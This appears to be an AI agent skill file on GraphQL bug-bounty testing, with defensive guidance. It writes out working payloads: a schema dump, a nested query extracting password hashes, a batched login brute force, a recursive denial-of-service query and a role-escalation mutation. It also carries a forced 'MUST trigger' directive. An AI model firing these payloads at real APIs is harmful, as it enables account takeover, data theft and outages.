---
name: graphql-injection-introspection
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Identify and exploit GraphQL API vulnerabilities by leveraging Introspection queries to dump
  the entire database schema, performing query batching to bypass rate limits (brute forcing), 
  and extracting deeply nested unauthorized data via graph relationship abuse.
domain: cybersecurity
subdomain: bug-hunting
category: API Security
difficulty: advanced
estimated_time: "3-5 hours"
mitre_attack:
  tactics: [TA0001, TA0007]
  techniques: [T1595.002, T1190, T1087]
platforms: [linux, windows]
tags: [graphql, introspection, api-security, query-batching, data-exfiltration, bug-hunting]
tools: [burpsuite, inql, graphql-cop]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# GraphQL Security & Introspection

## When to Use
- When intercepting web traffic that sends POST requests to `/graphql`, `/v1/graphql`, or `/api/graphql`.
- When requests contain `{"query": "query { ... }"}` or `{"variables": {...}}` JSON structures.
- To rapidly map the entire application data model (Introspection), or to test for IDOR/BOLA by exploiting deep relational nesting.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Detecting GraphQL & Enabling Introspection

```graphql
# Concept: Unlike REST, GraphQL uses a single endpoint. If "Introspection" is enabled,
# the GraphQL server will literally explain its entire structure (all queries, mutations, 
# and object types) to anyone requesting it.

# 1. Standard Introspection Query (Send via POST /graphql)
{"query":"\n    query IntrospectionQuery {\n      __schema {\n        queryType { name }\n        mutationType { name }\n        subscriptionType { name }\n        types {\n          ...FullType\n        }\n        directives {\n          name\n          description\n          locations\n          args {\n            ...InputValue\n          }\n        }\n      }\n    }\n\n    fragment FullType on __Type {\n      kind\n      name\n      description\n      fields(includeDeprecated: true) {\n        name\n        description\n        args {\n          ...InputValue\n        }\n        type {\n          ...TypeRef\n        }\n        isDeprecated\n        deprecationReason\n      }\n      inputFields {\n        ...InputValue\n      }\n      interfaces {\n        ...TypeRef\n      }\n      enumValues(includeDeprecated: true) {\n        name\n        description\n        isDeprecated\n        deprecationReason\n      }\n      possibleTypes {\n        ...TypeRef\n      }\n    }\n\n    fragment InputValue on __InputValue {\n      name\n      description\n      type { ...TypeRef }\n      defaultValue\n    }\n\n    fragment TypeRef on __Type {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n                ofType {\n                  kind\n                  name\n                  ofType {\n                    kind\n                    name\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  "}

# 2. Result Analysis:
# If successful, you will receive a massive JSON dump containing the schema.
# Copy the JSON and load it into a tool like GraphQL Voyager (visual graph) or InQL (Burp Extension) to map the database visually.
```

### Phase 2: Exploiting Graph Relationships (IDOR)

```graphql
# Concept: A developer might secure the `user(id: 5)` query. But what if `company` 
# has a relationship field linking back to `users`? You can bypass the authorization 
# check by traversing the graph backwards.

# Assume we are NOT authorized to query other users:
query {
  user(id: 1) { email } # Returns Error: Denied
}

# Malicious nested traversal:
# We query a public company, then request its employees, reaching the user data anyway!
query {
  company(id: 99) {
    name
    employees {
      id
      email
      password_hash
    }
  }
}
# Result: Successful extraction of all email addresses and hashes!
```

### Phase 3: Query Batching (Rate Limit Bypass / Brute Force)

```json
# Concept: GraphQL supports "query batching" allowing clients to send arrays of multiple 
# queries in one single HTTP request. This completely defeats traditional IP-based WAF 
# HTTP rate limits.

# Standard Rate Limiting sees ONE incoming HTTP request. But inside that request...
[
  {"query": "mutation { login(user: \"admin\", pass: \"12345\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"admin123\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"admin1234\") { token } }"}
  // ... Paste 50,000 queries here in one JSON array
]

# We executed 50,000 login attempts in a single network packet.
```

### Phase 4: Denial of Service (Deep Nested Queries)

```graphql
# Concept: Because GraphQL handles relationships dynamically, an attacker can request
# infinitely recursive relationships, crashing the backend server's CPU/Memory.

query {
  author(id: 1) {
    books {
      author {
        books {
          author {
            books {
              author {
                name    # Repeat 100 times until the backend runs out of memory (OOM crash)
              }
            }
          }
        }
      }
    }
  }
}
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Locate /graphql Endpoint] --> B{Run Introspection Query}
    B -->|Enabled| C[Export Schema. Map internal structure.]
    B -->|Disabled| D[Fuzz field names via Field Suggestion errors ('Did you mean...?')]
    C --> E[Test Nested Data Extraction IDORs]
    C --> F[Test Aliased Query Batching for Brute Force]
    C --> G[Test Recursive Denial of Service]
```


### 🏆 Elite Chaining Strategy (Top 1% Hunter Methodology)

> **Core Principle**: A single finding is a $500 report. A chained exploit is a $50,000 report.
> The top 1% of hunters spend 40+ hours on a single target, understanding it better than
> the developers who built it. They automate discovery, not exploitation.

**Chaining Decision Tree:**
```mermaid
graph TD
    A[Finding Discovered] --> B{Severity?}
    B -->|Low/Info| C[Can it enable recon?]
    B -->|Medium| D[Can it escalate access?]
    B -->|High/Crit| E[Document + PoC immediately]
    C -->|Yes| F[Chain: InfoLeak → targeted attack]
    C -->|No| G[Log but deprioritize]
    D -->|Yes| H[Chain: Medium + Priv Esc = Critical]
    D -->|No| I[Submit standalone if impact clear]
    F --> J[Re-evaluate combined severity]
    H --> J
    E --> K[Test lateral movement potential]
    J --> L[Write consolidated report with full attack chain]
    K --> L
```

**Common High-Payout Chains:**
| Chain Pattern | Typical Bounty | Example |
|--|--|--|
| SSRF → Cloud Metadata → IAM Keys | $15,000-$50,000 | Webhook URL → AWS creds → S3 data |
| Open Redirect → OAuth Token Theft | $5,000-$15,000 | Login redirect → steal auth code |
| IDOR + GraphQL Introspection | $3,000-$10,000 | Enumerate users → access any account |
| Race Condition → Financial Impact | $10,000-$30,000 | Duplicate gift cards → unlimited funds |
| XSS → ATO via Cookie Theft | $2,000-$8,000 | Stored XSS on admin page → session hijack |
| Info Disclosure → API Key Reuse | $5,000-$20,000 | JS file → hardcoded API key → admin access |

**The "Architect" vs "Scanner" Mindset:**
- ❌ **Scanner Mindset**: Run nuclei on 10,000 subdomains, submit the first hit → duplicates
- ✅ **Architect Mindset**: Spend 2 weeks mapping ONE application's business logic, RBAC model, 
  and integration seams → find what no scanner ever will

## 🔵 Blue Team Detection & Defense
- **Disable Introspection**: Production environments must strictly disable Introspection globally. It is designed for development and debugging, not public consumption.
- **Implement Depth Limitations**: Prevent recursive Denial of Service attacks by enforcing query depth limits (e.g., maximum depth of 5 nested relationships) in the GraphQL engine (Apollo/Relay).
- **Disable Batching**: Unless specifically required by the frontend client for performance, disable array-based query batching to prevent unmitigated brute-forcing and WAF evasion.
- **Resolver-Level Authorization**: Do not authorize data access at the top-level query path. Authorization must be performed at the node/resolver level so accessing `user` via `company.employees` checks the exact same permissions as querying `user(id: 5)` directly.

## Key Concepts
| Concept | Description |
|---------|-------------|
| GraphQL | A query-language API architecture alternative to REST allowing clients to request exactly the data payload they need, no more, no less |
| Introspection | A built-in system allowing a GraphQL client to query the GraphQL server for information about the underlying schema and types |
| Query Batching | Sending an array of multiple distinct GraphQL operations in a single HTTP POST request |
| Resolver | A function in the backend code responsible for fetching the data for a specific field within the GraphQL schema |

## Output Format
```
Bug Bounty Report: WAF Rate Limit Bypass via GraphQL Batching
=============================================================
Vulnerability: Application-Level Denial of Service & Authentication Bypass
Severity: High (CVSS 7.5)
Target: POST /graphql

Description:
The authentication endpoint utilizes GraphQL mutations (`loginMutation`) to process user logins. While the Cloudflare edge WAF limits HTTP requests to 10 per minute, the backend GraphQL server (Apollo) permits Query Batching. An attacker can construct a single HTTP request containing an array of 5,000 distinct login mutations, executing a massive brute-force attack entirely circumventing the HTTP rate limiter.

Reproduction Steps:
1. Intercept a standard login request.
2. Modify the JSON payload from a single object `{ "query": "mutation { login..." }` into a JSON array:
   `[ {"query": "mutation... pass='1'"}, {"query": "mutation... pass='2'"} ]`
3. Forward the request.
4. The server responds with an array of authentication failures and, sequentially, the successful authorization token.

Impact:
Immediate circumvention of brute-force protections allowing rapid credential stuffing resulting in Account Takeover (ATO).
```


### 📝 Elite Report Writing (Top 1% Standard)

> **"The difference between a $500 and $50,000 report is the quality of the writeup."**
> — Vickie Li, Bug Bounty Bootcamp

**Title Format**: `[VulnType] in [Component] Allows [BusinessImpact]`
- ❌ "XSS Found" → This tells the triager nothing
- ✅ "Stored XSS in /admin/comments Allows Session Hijacking of All Moderators"

**Report Structure (HackerOne-Optimized):**
1. **Summary** (2-4 sentences — triager reads only this first): What broke, how, worst-case.
2. **CVSS 4.0 Vector** — Must be defensible; wrong CVSS destroys credibility.
3. **Attack Scenario** — 3-5 sentence narrative from attacker's perspective.
4. **Impact** — MUST include at least one real number: "Affects 4.2M users" not "affects many users".
5. **Steps to Reproduce** — Deterministic. A junior dev who has never seen this bug reproduces it exactly.
6. **PoC** — Copy-paste runnable. No placeholders. Match the exact HTTP method.
7. **Remediation** — Don't say "sanitize input." Give the exact code fix, before/after.
8. **CWE + References** — SSRF→CWE-918, IDOR→CWE-639, SQLi→CWE-89, XSS→CWE-79.

**Pre-Report Verification (5 Checks):**
1. 🔍 **Hallucination Detector** — Verify endpoints, CVEs, and code paths are real
2. 🤖 **AI Writing Pattern Check** — Remove "Certainly!", "It's worth noting", generic phrasing
3. 🧪 **PoC Reproducibility** — Payload syntax valid for context? Prerequisites stated?
4. 📋 **Duplicate Detection** — Is this a scanner-generic finding? Known public disclosure?
5. 📈 **Impact Plausibility** — Severity matches technical capability? No inflation?



## 💰 Real-World Disclosed Bounties (GraphQL)

| Company | Bounty | Researcher | Technique | Year |
|---------|--------|-----------|-----------|------|
| **Facebook/Instagram** | $30,000 | (Undisclosed) | GraphQL IDOR — brute-force media IDs → expose private content | 2023 |
| **Shopify** | $5,000 | (Undisclosed) | GraphQL `BillingDocumentDownload` — predictable invoice IDs | 2024 |
| **GitLab** | $1,160 | (Undisclosed) | GraphQL `Ml::Model` — incremental IDs → access all private ML models | 2024 |

**Key Lesson**: GraphQL APIs are consistently vulnerable to IDOR because developers expose 
introspection in production and use predictable IDs. The Facebook $30K payout proves GraphQL 
IDOR can be Critical-severity when it exposes private user content at scale.

**The GraphQL attack checklist that finds real bugs:**
```graphql
# 1. Always try introspection first
{ __schema { types { name fields { name type { name } } } } }

# 2. Look for mutations that accept user-controlled IDs
mutation { updateUser(id: "VICTIM_ID", role: "admin") { id role } }

# 3. Test batching for rate-limit bypass
[{"query": "mutation { login(email:\"a@b.com\", pass:\"pass1\") { token } }"},
 {"query": "mutation { login(email:\"a@b.com\", pass:\"pass2\") { token } }"}]
```

## 🔴 Red Team
- Extract assets and enumerate endpoints.
- Execute initial payloads leveraging documented vulnerabilities.

## References
- PortSwigger: [GraphQL API vulnerabilities](https://portswigger.net/web-security/graphql)
- PayloadAllTheThings: [GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
- InQL: [GraphQL Security Testing Tool](https://github.com/doyensec/inql)
